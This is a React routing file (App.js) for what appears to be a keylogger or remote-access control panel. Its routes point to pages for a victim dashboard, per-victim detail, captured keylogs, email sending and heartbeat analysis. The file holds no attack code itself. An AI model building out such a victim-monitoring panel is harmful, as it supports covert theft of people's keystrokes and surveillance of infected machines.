import React from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import Dashboard from './pages/Dashboard';
import VictimDetail from './pages/VictimDetail';
import KeyLogs from './pages/Keylogs';
import Navbar from './components/Navbar';
import SendEmail from './pages/SendEmail';
import HeartbeatAnalyse from './pages/HeartbeatAnalyse';
import { ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

function App() {
  return (
    <Router>
      <Navbar />
      <ToastContainer position="top-right" autoClose={5000} hideProgressBar={false} />
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/victim/:id" element={<VictimDetail />} />
        <Route path="/victim/:id/keylogs" element={<KeyLogs />} />
        <Route path="/send-email" element={<SendEmail />} />
        <Route path="/heartbeat/analyse/:id" element={<HeartbeatAnalyse />} />
      </Routes>
    </Router>
  );
}

export default App;
